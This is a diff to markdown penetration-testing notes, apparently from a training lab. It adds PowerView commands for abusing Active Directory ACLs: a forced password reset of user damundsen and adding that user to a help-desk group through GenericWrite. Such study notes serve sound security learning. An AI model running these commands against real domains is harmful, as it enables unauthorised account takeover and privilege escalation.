@@ -71,3 +71,22 @@ $adunnsid = Convert-NameToSid adunn
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
 ```
 
+# ACL Abuse Tactics
+
+## Abusing ACLs
+### Abusing Force Change Password
+
+```powershell
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+
+$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+```
+
+### Abusing GenericWrite on a Group
+
+```powershell
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+```
